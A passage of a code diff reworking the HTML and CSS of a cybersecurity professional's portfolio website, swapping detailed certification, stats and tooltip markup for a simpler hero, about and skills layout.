-        .contact-card:hover {
-            transform: translateY(-10px);
-            box-shadow: var(--shadow-hover);
-        }
-
-        .contact-icon {
-            font-size: 3rem;
-            color: var(--primary-color);
-            margin-bottom: 1rem;
-        }
-
-        .social-links {
-            display: flex;
-            justify-content: center;
-            gap: 1rem;
-            margin-top: 2rem;
-        }
-        .mouse-trail {
-            position: fixed;
-            width: 6px;
-            height: 6px;
-            background: radial-gradient(circle, var(--primary-color) 0%, transparent 70%);
-            border-radius: 50%;
-            pointer-events: none;
-            z-index: 9999;
-            opacity: 0;
-            transition: opacity 0.3s ease;
-        }
-        .social-link {
-            width: 50px;
-            height: 50px;
-            background: var(--gradient-1);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            text-decoration: none;
-            transition: all 0.3s ease;
-            font-size: 1.5rem;
-        }
-
-        .social-link:hover {
-            transform: translateY(-5px) scale(1.1);
-            box-shadow: var(--shadow-hover);
-        }
-
-        /* Mobile Responsiveness */
-        @media (max-width: 768px) {
-            .nav-links {
-                display: none;
-            }
-
-            .timeline::before {
-                left: 30px;
-            }
-
-            .timeline-item {
-                width: 100%;
-                left: 0 !important;
-                text-align: left !important;
-                padding-left: 4rem;
-            }
-
-            .timeline-item .timeline-dot {
-                left: 20px !important;
-                right: auto !important;
-            }
-
-            .tab-navigation {
-                bottom: 10px;
-                right: 10px;
-            }
-
-            .theme-selector {
-                bottom: 10px;
-                left: 10px;
-                padding: 8px;
-            }
-
-            .professional-badges {
-                flex-direction: column;
-                align-items: center;
-            }
-
-            .skills-categories {
-                grid-template-columns: 1fr;
-            }
-
-            .carousel-slide {
-                padding: 2rem 1rem;
-            }
-
-            .projects-grid {
-                grid-template-columns: 1fr;
-            }
-        }
-
-        /* Scroll Progress Bar */
-        .scroll-progress {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 0%;
-            height: 3px;
-            background: var(--gradient-1);
-            z-index: 10000;
-            transition: width 0.1s ease;
-        }
-
-        /* Additional Animations */
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.7; }
-        }
-
-        @keyframes blink {
-            0%, 50% { opacity: 1; }
-            51%, 100% { opacity: 0; }
-        }
-
-        @keyframes fadeInUp {
-            from {
-                opacity: 0;
-                transform: translateY(30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .fade-in-up {
-            animation: fadeInUp 0.8s ease forwards;
-        }
-
-        /* Resume Modal */
-        .resume-modal {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.9);
-            z-index: 20000;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            backdrop-filter: blur(10px);
-        }
-
-        .resume-content {
-            background: white;
-            border-radius: 15px;
-            padding: 2rem;
-            max-width: 90%;
-            max-height: 90%;
-            overflow-y: auto;
-            position: relative;
-            box-shadow: var(--shadow-hover);
-        }
-
-        .resume-close {
-            position: absolute;
-            top: 15px;
-            right: 20px;
-            font-size: 2rem;
-            cursor: pointer;
-            color: var(--primary-color);
-            transition: all 0.3s ease;
-        }
-
-        .resume-close:hover {
-            transform: rotate(90deg);
-            color: #ff0000;
-        }
-        .timeline-text { 
-            color: white;
-        }
-    </style>
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
 </head>
-<body>
-    <!-- Enhanced Loading Screen -->
+<body data-theme="monochrome">
+    <!-- Loading Screen -->
     <div class="loading" id="loading">
         <div class="loader-container">
             <div class="cyber-loader"></div>
-            <div class="loading-text">Loading Security Portfolio...</div>
+            <div class="loading-text">Initializing Security Portfolio...</div>
         </div>
     </div>
 
-    <!-- Scroll Progress Bar -->
+    <!-- Progress Bar -->
     <div class="scroll-progress" id="scroll-progress"></div>
 
-    <!-- Particle Background -->
-    <div id="particles-js"></div>
-
-    <!-- Custom Tooltip -->
-    <div class="tooltip" id="custom-tooltip"></div>
-
     <!-- Theme Selector -->
-    <div class="theme-selector">
-        <div class="theme-btn red active" onclick="setTheme('red')" data-tooltip="Professional Red Theme - Perfect for cybersecurity branding"></div>
-        <div class="theme-btn blue" onclick="setTheme('blue')" data-tooltip="Tech Blue Theme - Modern technology focus"></div>
-        <div class="theme-btn green" onclick="setTheme('green')" data-tooltip="Security Green Theme - Military-grade security feel"></div>
-        <div class="theme-btn purple" onclick="setTheme('purple')" data-tooltip="Innovation Purple Theme - Creative technology approach"></div>
-    </div>
-
-    <!-- Tab Navigation -->
-    <div class="tab-navigation">
-        <div class="nav-tab active" onclick="scrollToSection('home')" data-tooltip="Home - Portfolio overview and introduction">
-            <i class="fas fa-home"></i>
-        </div>
-        <div class="nav-tab" onclick="scrollToSection('about')" data-tooltip="About - Background and experience summary">
-            <i class="fas fa-user-secret"></i>
-        </div>
-        <div class="nav-tab" onclick="scrollToSection('skills')" data-tooltip="Skills - Technical expertise and certifications">
-            <i class="fas fa-code"></i>
-        </div>
-        <div class="nav-tab" onclick="scrollToSection('experience')" data-tooltip="Experience - Professional timeline and achievements">
-            <i class="fas fa-briefcase"></i>
-        </div>
-        <div class="nav-tab" onclick="scrollToSection('projects')" data-tooltip="Projects - Portfolio of completed work and research">
-            <i class="fas fa-project-diagram"></i>
-        </div>
-        <div class="nav-tab" onclick="scrollToSection('contact')" data-tooltip="Contact - Get in touch for opportunities">
-            <i class="fas fa-envelope"></i>
-        </div>
+    <div class="theme-selector" id="theme-selector">
+        <button class="theme-btn monochrome active" data-theme="monochrome" aria-label="Black & White Theme">
+            <i class="fas fa-adjust"></i>
+        </button>
+        <button class="theme-btn red" data-theme="red" aria-label="Red Theme">
+            <i class="fas fa-circle"></i>
+        </button>
+        <button class="theme-btn blue" data-theme="blue" aria-label="Blue Theme">
+            <i class="fas fa-circle"></i>
+        </button>
+        <button class="theme-btn green" data-theme="green" aria-label="Green Theme">
+            <i class="fas fa-circle"></i>
+        </button>
+        <button class="theme-btn purple" data-theme="purple" aria-label="Purple Theme">
+            <i class="fas fa-circle"></i>
+        </button>
     </div>
 
     <!-- Navigation -->
-    <nav class="navbar">
+    <nav class="navbar" id="navbar">
         <div class="nav-container">
             <a href="#home" class="logo">MR</a>
-            <ul class="nav-links">
+            <button class="mobile-toggle" id="mobile-toggle">
+                <span></span>
+                <span></span>
+                <span></span>
+            </button>
+            <ul class="nav-links" id="nav-links">
                 <li><a href="#home">Home</a></li>
                 <li><a href="#about">About</a></li>
                 <li><a href="#skills">Skills</a></li>
                 <li><a href="#experience">Experience</a></li>
                 <li><a href="#projects">Projects</a></li>
+                <li><a href="#certifications">Certifications</a></li>
                 <li><a href="#contact">Contact</a></li>
             </ul>
         </div>
@@ -1486,1547 +84,346 @@
 
     <!-- Hero Section -->
     <section id="home" class="hero">
-        <div class="hero-background"></div>
-        <div class="terminal-commands" id="terminal-commands"></div>
-
-
-        <div class="matrix-rain" id="matrix-rain"></div>
+        <div class="hero-background">
+            <div id="particles-js"></div>
+            <div class="matrix-rain" id="matrix-rain"></div>
+        </div>
         
         <div class="hero-content">
-            <div class="professional-badges" data-aos="fade-up">
-                <div class="badge" data-tooltip="Completed April 2025 - Advanced penetration testing certification"><i class="fas fa-certificate"></i> OSCP Certified</div>
-                <div class="badge" data-tooltip="University of Sheffield MSc in Cybersecurity & AI - Graduating 2025 - Russell Group University - Top 100 University"><i class="fas fa-graduation-cap"></i> University of Sheffield Graduate - World Top 100 University - Russell Group</div>
-                <div class="badge" data-tooltip="Currently pursuing CREST certification - UK penetration testing standard"><i class="fas fa-shield-alt"></i> CREST In Progress</div>
-                <div class="badge" data-tooltip="5+ years software engineering with recent cybersecurity focus"><i class="fas fa-code"></i> 5+ Years Experience</div>
+            <div class="hero-badges">
+                <span class="badge"><i class="fas fa-shield-alt"></i> OSCP Certified</span>
+                <span class="badge"><i class="fas fa-code"></i> Full-Stack Developer</span>
+                <span class="badge"><i class="fas fa-graduation-cap"></i> Sheffield University MSc</span>
+                <span class="badge"><i class="fas fa-building"></i> 5+ Years Experience</span>
             </div>
             
-            <div class="hero-subtitle" data-aos="fade-up" data-aos-delay="200">
-                OSCP-Certified Cybersecurity Specialist | Sheffield University Graduate
-            </div>
-            <h1 class="hero-title" data-aos="fade-up" data-aos-delay="400">Muhammad Ramis</h1>
-            
-            <div class="hero-typed" data-aos="fade-up" data-aos-delay="600">
-                <span id="typed-text"></span><span class="typed-cursor">|</span>
-            </div>
-
-            <div class="uk-status" data-aos="fade-up" data-aos-delay="800">
-                <div class="uk-highlight">
-                    <i class="fas fa-map-marker-alt"></i>
-                    Based in Leeds, West Yorkshire
-                </div>
-                <p style="color: #94a3b8; font-size: 1.1rem; margin-bottom: 1rem;">
-                    Sheffield University MSc graduate in Cybersecurity & AI • Available for immediate opportunities
-                </p>
-                <div style="display: flex; justify-content: center; gap: 2rem; flex-wrap: wrap;">
-                    <div>
-                        <i class="fas fa-phone" style="color: var(--primary-color); margin-right: 0.5rem;"></i>
-                        <span data-tooltip="UK mobile number - available for calls">07789 399 920</span>
-                    </div>
-                    <div>
-                        <i class="fas fa-envelope" style="color: var(--primary-color); margin-right: 0.5rem;"></i>
-                        <span data-tooltip="Professional email for job opportunities">mramis1@outlook.com</span>
-                    </div>
-                </div>
+            <h1 class="hero-title">Muhammad Ramis</h1>
+            <div class="hero-subtitle">
+                <span id="typed-text"></span><span class="cursor">|</span>
             </div>
             
-            <div class="terminal-window" data-aos="fade-up" data-aos-delay="1000">
-                <div class="terminal-header">
-                    <div class="terminal-buttons">
-                        <div class="terminal-btn red"></div>
-                        <div class="terminal-btn yellow"></div>
-                        <div class="terminal-btn green"></div>
-                    </div>
-                    <div class="terminal-title">ramis@leeds-cybersec:~$</div>
-                </div>
-                <div class="terminal-content">
-                    <div><span class="terminal-prompt">ramis@leeds-cybersec:~$</span> <span class="terminal-command">whoami</span></div>
-                    <div class="terminal-output">OSCP-Certified Cybersecurity Specialist | Sheffield University Graduate</div>
-                    <div><span class="terminal-prompt">ramis@leeds-cybersec:~$</span> <span class="terminal-command">cat education.txt</span></div>
-                    <div class="terminal-output">MSc Cybersecurity & AI - University of Sheffield (2024-2025)</div>
-                    <div><span class="terminal-prompt">ramis@leeds-cybersec:~$</span> <span class="terminal-command">ls -la certifications/</span></div>
-                    <div class="terminal-output">OSCP ✓ | OSCP+ ✓ | CREST (In Progress) | Employee of Month Award</div>
-                    <div><span class="terminal-prompt">ramis@leeds-cybersec:~$</span> <span class="terminal-command">cat location.txt</span></div>
-                    <div class="terminal-output">📍 Leeds, West Yorkshire | 🇬🇧 Available for UK opportunities</div>
-                    <div><span class="terminal-prompt">ramis@leeds-cybersec:~$</span> <span class="terminal-command">echo $SPECIALTIES</span></div>
-                    <div class="terminal-output">Penetration Testing | Vulnerability Assessment | Secure Development</div>
-                    <div><span class="terminal-prompt">ramis@leeds-cybersec:~$</span> <span class="terminal-command">contact --professional</span></div>
-                    <div class="terminal-output">📧 mramis1@outlook.com | 📱 07789 399 920 | 🔗 LinkedIn & GitHub</div>
-                </div>
+            <div class="hero-location">
+                <i class="fas fa-map-marker-alt"></i> Leeds, West Yorkshire, UK
+                <span class="separator">•</span>
+                <i class="fas fa-check-circle"></i> Available for Immediate Start
             </div>
             
-            <div class="cta-buttons" data-aos="fade-up" data-aos-delay="1200">
-                <button class="resume-btn" onclick="openResumeModal()" data-tooltip="Download comprehensive CV with all certifications and experience">
-                    <i class="fas fa-file-pdf"></i>
-                    Download CV/Resume
-                </button>
-                <a href="#contact" class="resume-btn" style="background: transparent; border: 2px solid var(--primary-color);" data-tooltip="Get in touch for job opportunities and collaboration">
-                    <i class="fas fa-envelope"></i>
-                    Contact for Opportunities
+            <div class="hero-cta">
+                <a href="#contact" class="btn btn-primary">
+                    <i class="fas fa-envelope"></i> Get in Touch
                 </a>
+                <button class="btn btn-secondary" onclick="window.open('assets/Muhammad_Ramis_CV.pdf')">
+                    <i class="fas fa-download"></i> Download CV
+                </button>
+            </div>
+            
+            <div class="hero-terminal">
+                <div class="terminal-header">
+                    <span class="terminal-title">ramis@cybersec:~$</span>
+                </div>
+                <div class="terminal-body" id="terminal-output"></div>
             </div>
         </div>
     </section>
 
     <!-- About Section -->
-    <section id="about" class="section section-white">
-        <div class="section-title" data-aos="fade-up">About Me</div>
-        <div class="section-subtitle" data-aos="fade-up" data-aos-delay="200">
-            Sheffield University graduate transitioning from software engineering to cybersecurity excellence
-        </div>
-
-        <div style="max-width: 900px; margin: 0 auto; text-align: center;" data-aos="fade-up" data-aos-delay="400">
-            <p style="font-size: 1.2rem; line-height: 1.8; color: var(--text-light); margin-bottom: 2rem;">
-                I'm an <strong>OSCP-certified cybersecurity specialist</strong> recently graduating from the 
-                <strong>University of Sheffield</strong> with an MSc in Cybersecurity and Artificial Intelligence. 
-                My unique background combines <strong>5+ years of software engineering experience</strong> with 
-                focused cybersecurity training, giving me deep insights into both building and securing systems.
-            </p>
-            
-            <p style="font-size: 1.1rem; line-height: 1.8; color: var(--text-light); margin-bottom: 2rem;">
-                Based in <strong>Leeds, West Yorkshire</strong>, I'm actively seeking <strong>junior to mid-level 
-                cybersecurity opportunities</strong> in the UK market. My experience spans enterprise security 
-                implementations, vulnerability assessments, and secure payment systems, complemented by strong 
-                technical leadership and project management skills.
-            </p>
-
-            <p style="font-size: 1.1rem; line-height: 1.8; color: var(--text-light);">
-                I bring a <strong>developer's perspective to cybersecurity challenges</strong>, understanding how 
-                applications are built and where vulnerabilities commonly occur. This dual expertise makes me 
-                particularly effective at <strong>vulnerability assessment, secure code review, and DevSecOps 
-                implementation</strong>.
-            </p>
-        </div>
-
-        <div class="enhanced-stats" data-aos="fade-up" data-aos-delay="600">
-            <div class="stat-card" data-tooltip="System availability improvement through enhanced Linux cluster security configurations">
-                <div class="stat-icon"><i class="fas fa-chart-line"></i></div>
-                <div class="stat-number">25%</div>
-                <div class="stat-label">System Availability Improvement</div>
-                <div class="stat-description">Enhanced Linux cluster security achieving significant uptime gains</div>
-            </div>
-            
-            <div class="stat-card" data-tooltip="Comprehensive security assessments across web applications, networks, and infrastructure">
-                <div class="stat-icon"><i class="fas fa-shield-alt"></i></div>
-                <div class="stat-number">5+</div>
-                <div class="stat-label">Security Assessments Completed</div>
-                <div class="stat-description">Vulnerability assessments and penetration testing engagements</div>
-            </div>
-            
-            <div class="stat-card" data-tooltip="OSCP courses including PEN-200, PEN-210, PEN-300, SOC-200, WEB-200">
-                <div class="stat-icon"><i class="fas fa-certificate"></i></div>
-                <div class="stat-number">1/5</div>
-                <div class="stat-label">OSCP Courses Completed</div>
-                <div class="stat-description">Advanced penetration testing and security training</div>
-            </div>
-            
-            <div class="stat-card" data-tooltip="Zero security incidents over 24 months with successful PCI DSS compliance">
-                <div class="stat-icon"><i class="fas fa-lock"></i></div>
-                <div class="stat-number">0</div>
-                <div class="stat-label">Security Incidents (24 months)</div>
-                <div class="stat-description">Perfect security record with PCI DSS compliance</div>
-            </div>
-            
-            <div class="stat-card" data-tooltip="API performance improvements and system optimization achievements">
-                <div class="stat-icon"><i class="fas fa-tachometer-alt"></i></div>
-                <div class="stat-number">30%</div>
-                <div class="stat-label">Performance Improvements</div>
-                <div class="stat-description">API response time reduction and system optimization</div>
-            </div>
-            
-            <div class="stat-card" data-tooltip="Multiple programming competition victories and hackathon awards">
-                <div class="stat-icon"><i class="fas fa-trophy"></i></div>
-                <div class="stat-number">4</div>
-                <div class="stat-label">Competition Awards</div>
-                <div class="stat-description">Hackathon victories and programming excellence recognition</div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Certifications Section -->
-    <section id="certifications" class="section section-dark">
-        <div class="section-title" data-aos="fade-up">Professional Certifications</div>
-        <div class="section-subtitle" data-aos="fade-up" data-aos-delay="200">
-            Industry-recognized credentials demonstrating expertise in cybersecurity and penetration testing
-        </div>
-
-        <div class="certifications-grid" data-aos="fade-up" data-aos-delay="400">
-            <div class="cert-card featured" data-tooltip="penetration testing certification - Credential ID: 140250238">
-                <div class="cert-badge">
-                    <i class="fas fa-shield-alt"></i>
+    <section id="about" class="section">
+        <div class="container">
+            <h2 class="section-title">About Me</h2>
+            <div class="about-content">
+                <div class="about-text">
+                    <p class="lead">
+                        I'm an <strong>OSCP-certified cybersecurity professional</strong> and <strong>experienced full-stack developer</strong> 
+                        with a unique blend of offensive security expertise and software engineering excellence.
+                    </p>
+                    <p>
+                        Recently graduating from the <strong>University of Sheffield</strong> with an MSc in Cybersecurity and AI, 
+                        I bring <strong>5+ years of development experience</strong> across enterprise applications, payment systems, 
+                        and blockchain technologies, combined with advanced penetration testing skills.
+                    </p>
+                    <p>
+                        My background spans from low-level programming in Assembly and C to modern frameworks like Laravel, Django, 
+                        and React, giving me deep insights into both building and breaking systems. This dual expertise makes me 
+                        particularly effective at <strong>secure architecture design</strong>, <strong>DevSecOps implementation</strong>, 
+                        and <strong>comprehensive security assessments</strong>.
+                    </p>
                 </div>
-                <div class="cert-name">OSCP</div>
-                <div class="cert-full-name">Offensive Security Certified Professional</div>
-                <div class="cert-org">Offensive Security</div>
-                <div class="cert-date">April 2025</div>
-                <div class="cert-status verified"><a href="https://credentials.offsec.com/5185a463-88bf-4ad2-8546-2555585d8cc4#acc.fFbVLAta" target="_blank">✓ Verified</a></div>
-                <div class="cert-description">
-                    Advanced penetration testing, privilege escalation, Active Directory attacks, and manual exploitation techniques
+                
+                <div class="about-stats">
+                    <div class="stat-card">
+                        <div class="stat-icon"><i class="fas fa-shield-alt"></i></div>
+                        <div class="stat-value">OSCP+</div>
+                        <div class="stat-label">Advanced Certifications</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-icon"><i class="fas fa-code"></i></div>
+                        <div class="stat-value">15+</div>
+                        <div class="stat-label">Technologies Mastered</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-icon"><i class="fas fa-project-diagram"></i></div>
+                        <div class="stat-value">25+</div>
+                        <div class="stat-label">Projects Delivered</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-icon"><i class="fas fa-lock"></i></div>
+                        <div class="stat-value">0</div>
+                        <div class="stat-label">Security Incidents</div>
+                    </div>
                 </div>
-            </div>
-
-            <div class="cert-card featured" data-tooltip="Advanced cloud enumeration and exploitation techniques - Credential ID: 140250238">
-                <div class="cert-badge">
-                    <i class="fas fa-cloud"></i>
-                </div>
-                <div class="cert-name">OSCP+</div>
-                <div class="cert-full-name">OSCP+ Advanced Certification</div>
-                <div class="cert-org">Offensive Security</div>
-                <div class="cert-date">April 2025</div>
-                <div class="cert-status verified"><a target="_blank" href="https://credentials.offsec.com/559e642d-824b-4657-bdd9-8b315e1845f7#acc.MxVIzcvH">✓ Verified</a></div>
-                <div class="cert-description">
-                    Cloud enumeration, password spray attacks, advanced exploitation techniques, and enterprise security testing
-                </div>
-            </div>
-
-            <div class="cert-card in-progress" data-tooltip="UK's leading penetration testing certification - Expected completion August 2025">
-                <div class="cert-badge">
-                    <i class="fas fa-flag"></i>
-                </div>
-                <div class="cert-name">CREST</div>
-                <div class="cert-full-name">CREST Penetration Testing Certification</div>
-                <div class="cert-org">CREST UK</div>
-                <div class="cert-date">In Progress</div>
-                <div class="cert-status in-progress">⏳ Expected Aug 2025</div>
-                <div class="cert-description">
-                    UK's premier penetration testing qualification recognized by government and enterprise organizations
-                </div>
-            </div>
-
-            <div class="cert-card academic" data-tooltip="Merit classification expected - Specialized in Digital Forensics and Machine Learning for Security">
-                <div class="cert-badge">
-                    <i class="fas fa-graduation-cap"></i>
-                </div>
-                <div class="cert-name">MSc</div>
-                <div class="cert-full-name">Cybersecurity & Artificial Intelligence</div>
-                <div class="cert-org">University of Sheffield</div>
-                <div class="cert-date">2024-2025</div>
-                <div class="cert-status verified">🎓 Graduate</div>
-                <div class="cert-description">
-                    Advanced cybersecurity concepts, AI applications in security, digital forensics, and secure software development
-                </div>
-            </div>
-        </div>
-
-        <div class="cert-achievements" data-aos="fade-up" data-aos-delay="600">
-            <div class="achievement-item" data-tooltip="Recognition for outstanding performance and contributions">
-                <i class="fas fa-trophy"></i>
-                <span>Employee of the Month - Apricart E-Stores (2021)</span>
-            </div>
-            <div class="achievement-item" data-tooltip="Blockchain and AI hackathon victory demonstrating technical innovation">
-                <i class="fas fa-medal"></i>
-                <span>Crypto Chicks Hackathon Winner (2019)</span>
-            </div>
-            <div class="achievement-item" data-tooltip="Programming competition excellence at regional level">
-                <i class="fas fa-code"></i>
-                <span>ICPC Lahore Regional Fastest Problem Solver (2017)</span>
             </div>
         </div>
     </section>
 
     <!-- Skills Section -->
-    <section id="skills" class="section section-white">
-        <div class="section-title" data-aos="fade-up">Technical Expertise</div>
-        <div class="section-subtitle" data-aos="fade-up" data-aos-delay="200">
-            Comprehensive cybersecurity skills with strong software engineering foundation
-        </div>
-
-        <div class="skills-section">
-            <div class="skills-categories">
-                <div class="skill-category" data-aos="fade-up" data-aos-delay="200">
-                    <div class="skill-category-title">
-                        <i class="fas fa-user-secret"></i>
-                        Penetration Testing & Security Assessment
-                    </div>
+    <section id="skills" class="section section-alt">
+        <div class="container">
+            <h2 class="section-title">Technical Expertise</h2>
+            
+            <div class="skills-grid">
+                <!-- Cybersecurity Skills -->
+                <div class="skill-category">
+                    <h3 class="category-title">
+                        <i class="fas fa-shield-alt"></i> Cybersecurity & Penetration Testing
+                    </h3>
                     <div class="skill-tags">
-                        <span class="skill-tag expert" data-tooltip="OSCP certified web application security testing - Expert level proficiency">Web Application Testing</span>
-                        <span class="skill-tag expert" data-tooltip="Network infrastructure penetration testing - Expert level proficiency">Network Security Assessment</span>
-                        <span class="skill-tag advanced" data-tooltip="Windows Active Directory attack techniques - Advanced proficiency">Active Directory Exploitation</span>
-                        <span class="skill-tag expert" data-tooltip="Linux and Windows privilege escalation - Expert level proficiency">Privilege Escalation</span>
-                        <span class="skill-tag advanced" data-tooltip="AWS, Azure cloud security testing - Advanced proficiency">Cloud Infrastructure Testing</span>
-                        <span class="skill-tag intermediate" data-tooltip="Enterprise wireless network security - Intermediate proficiency">Wireless Network Testing</span>
-                        <span class="skill-tag intermediate" data-tooltip="IoT and embedded systems security - Intermediate proficiency">IoT/Embedded Systems</span>
+                        <span class="skill-tag expert">Web Application Security</span>
+                        <span class="skill-tag expert">Network Penetration Testing</span>
+                        <span class="skill-tag advanced">Active Directory Exploitation</span>
+                        <span class="skill-tag expert">OWASP Top 10</span>
+                        <span class="skill-tag advanced">Cloud Security (AWS/Azure)</span>
+                        <span class="skill-tag intermediate">Wireless Security</span>
+                        <span class="skill-tag expert">Vulnerability Assessment</span>
+                        <span class="skill-tag advanced">Security Code Review</span>
                     </div>
                 </div>
 
-                <div class="skill-category" data-aos="fade-up" data-aos-delay="400">
-                    <div class="skill-category-title">
-                        <i class="fas fa-tools"></i>
-                        Security Tools & Frameworks
-                    </div>
+                <!-- Development Languages -->
+                <div class="skill-category">
+                    <h3 class="category-title">
+                        <i class="fas fa-code"></i> Programming Languages
+                    </h3>
                     <div class="skill-tags">
-                        <span class="skill-tag expert" data-tooltip="Professional web application security testing suite - Expert level proficiency">Burp Suite Professional</span>
-                        <span class="skill-tag expert" data-tooltip="Exploitation framework for penetration testing - Expert level proficiency">Metasploit Framework</span>
-                        <span class="skill-tag expert" data-tooltip="Network discovery and security auditing - Expert level proficiency">Nmap</span>
-                        <span class="skill-tag advanced" data-tooltip="Network protocol analyzer and packet capture - Advanced proficiency">Wireshark</span>
-                        <span class="skill-tag advanced" data-tooltip="Vulnerability assessment and management - Advanced proficiency">Nessus</span>
-                        <span class="skill-tag advanced" data-tooltip="OWASP web application security scanner - Advanced proficiency">OWASP ZAP</span>
-                        <span class="skill-tag intermediate" data-tooltip="Advanced persistent threat simulation - Intermediate proficiency">Cobalt Strike</span>
-                        <span class="skill-tag expert" data-tooltip="Penetration testing Linux distribution - Expert level proficiency">Kali Linux</span>
+                        <span class="skill-tag expert">Python</span>
+                        <span class="skill-tag expert">PHP</span>
+                        <span class="skill-tag expert">JavaScript/TypeScript</span>
+                        <span class="skill-tag advanced">Go</span>
+                        <span class="skill-tag advanced">C#/.NET</span>
+                        <span class="skill-tag intermediate">Java</span>
+                        <span class="skill-tag advanced">SQL</span>
+                        <span class="skill-tag intermediate">Solidity</span>
+                        <span class="skill-tag advanced">Bash/PowerShell</span>
+                        <span class="skill-tag intermediate">Assembly (x86)</span>
                     </div>
                 </div>
 
-                <div class="skill-category" data-aos="fade-up" data-aos-delay="600">
-                    <div class="skill-category-title">
-                        <i class="fas fa-search"></i>
-                        Reverse Engineering & Binary Analysis
-                    </div>
+                <!-- Frameworks & Technologies -->
+                <div class="skill-category">
+                    <h3 class="category-title">
+                        <i class="fas fa-layer-group"></i> Frameworks & Technologies
+                    </h3>
                     <div class="skill-tags">
-                        <span class="skill-tag advanced" data-tooltip="NSA's software reverse engineering framework - Advanced proficiency">Ghidra</span>
-                        <span class="skill-tag intermediate" data-tooltip="Professional disassembler and debugger - Intermediate proficiency">IDA Pro</span>
-                        <span class="skill-tag intermediate" data-tooltip="Modern binary analysis platform - Intermediate proficiency">Binary Ninja</span>
-                        <span class="skill-tag advanced" data-tooltip="32-bit assembler level analyzing debugger - Advanced proficiency">OllyDbg</span>
-                        <span class="skill-tag advanced" data-tooltip="GNU debugger with enhanced features - Advanced proficiency">GDB/GEF</span>
-                        <span class="skill-tag intermediate" data-tooltip="LLVM-based debugger - Intermediate proficiency">LLDB</span>
-                        <span class="skill-tag beginner" data-tooltip="macOS reverse engineering tool - Beginner proficiency">Hopper</span>
+                        <span class="skill-tag expert">Laravel</span>
+                        <span class="skill-tag advanced">Django/Flask</span>
+                        <span class="skill-tag expert">React/Next.js</span>
+                        <span class="skill-tag advanced">Node.js/Express</span>
+                        <span class="skill-tag advanced">Entity Framework</span>
+                        <span class="skill-tag expert">CodeIgniter</span>
+                        <span class="skill-tag advanced">Vue.js</span>
+                        <span class="skill-tag intermediate">Angular</span>
+                        <span class="skill-tag advanced">FastAPI</span>
+                        <span class="skill-tag expert">RESTful APIs</span>
+                        <span class="skill-tag advanced">GraphQL</span>
+                        <span class="skill-tag advanced">Microservices</span>
                     </div>
                 </div>
 
-                <div class="skill-category" data-aos="fade-up" data-aos-delay="800">
-                    <div class="skill-category-title">
-                        <i class="fas fa-shield-alt"></i>
-                        Defensive Security & Forensics
-                    </div>
+                <!-- E-commerce & CMS -->
+                <div class="skill-category">
+                    <h3 class="category-title">
+                        <i class="fas fa-shopping-cart"></i> E-commerce & CMS
+                    </h3>
                     <div class="skill-tags">
-                        <span class="skill-tag advanced" data-tooltip="Intrusion detection and prevention systems - Advanced proficiency">IDS/IPS Configuration</span>
-                        <span class="skill-tag intermediate" data-tooltip="Digital forensics and incident response - Intermediate proficiency">Digital Forensics</span>
-                        <span class="skill-tag beginner" data-tooltip="IoT device forensic analysis - Beginner proficiency">IoT Forensics</span>
-                        <span class="skill-tag intermediate" data-tooltip="Memory dump analysis and malware detection - Intermediate proficiency">Memory Analysis</span>
-                        <span class="skill-tag advanced" data-tooltip="Security incident response procedures - Advanced proficiency">Incident Response</span>
-                        <span class="skill-tag advanced" data-tooltip="Security risk assessment and modeling - Advanced proficiency">Threat Modeling</span>
+                        <span class="skill-tag expert">Magento 2</span>
+                        <span class="skill-tag expert">WordPress/WooCommerce</span>
+                        <span class="skill-tag advanced">Shopify</span>
+                        <span class="skill-tag expert">Payment Gateway Integration</span>
+                        <span class="skill-tag advanced">Stripe/PayPal APIs</span>
+                        <span class="skill-tag expert">PCI DSS Compliance</span>
+                        <span class="skill-tag advanced">Custom CMS Development</span>
+                        <span class="skill-tag intermediate">PrestaShop</span>
                     </div>
                 </div>
 
-                <div class="skill-category" data-aos="fade-up" data-aos-delay="1000">
-                    <div class="skill-category-title">
-                        <i class="fas fa-code"></i>
-                        Programming & Security Automation
-                    </div>
+                <!-- DevOps & Infrastructure -->
+                <div class="skill-category">
+                    <h3 class="category-title">
+                        <i class="fas fa-server"></i> DevOps & Infrastructure
+                    </h3>
                     <div class="skill-tags">
-                        <span class="skill-tag expert" data-tooltip="Security scripting and automation - Expert level proficiency">Python</span>
-                        <span class="skill-tag advanced" data-tooltip="Windows administration and exploitation - Advanced proficiency">PowerShell</span>
-                        <span class="skill-tag expert" data-tooltip="Linux shell scripting and automation - Expert level proficiency">Bash</span>
-                        <span class="skill-tag expert" data-tooltip="Web application development and security - Expert level proficiency">JavaScript</span>
-                        <span class="skill-tag expert" data-tooltip="Database security and SQL injection - Expert level proficiency">SQL</span>
-                        <span class="skill-tag intermediate" data-tooltip="Machine learning for security applications - Intermediate proficiency">PyTorch</span>
-                        <span class="skill-tag advanced" data-tooltip="Automated security testing and validation - Advanced proficiency">Security Automation</span>
+                        <span class="skill-tag expert">Linux Administration</span>
+                        <span class="skill-tag advanced">Docker/Kubernetes</span>
+                        <span class="skill-tag advanced">CI/CD Pipelines</span>
+                        <span class="skill-tag expert">AWS</span>
+                        <span class="skill-tag intermediate">Azure</span>
+                        <span class="skill-tag advanced">Nginx/Apache</span>
+                        <span class="skill-tag expert">Git/GitHub</span>
+                        <span class="skill-tag advanced">Infrastructure as Code</span>
+                        <span class="skill-tag intermediate">Terraform</span>
                     </div>
                 </div>
 
-                <div class="skill-category" data-aos="fade-up" data-aos-delay="1200">
-                    <div class="skill-category-title">
-                        <i class="fas fa-clipboard-list"></i>
-                        Methodologies & Compliance
-                    </div>
+                <!-- Blockchain & Emerging Tech -->
+                <div class="skill-category">
+                    <h3 class="category-title">
+                        <i class="fas fa-link"></i> Blockchain & Emerging Technologies
+                    </h3>
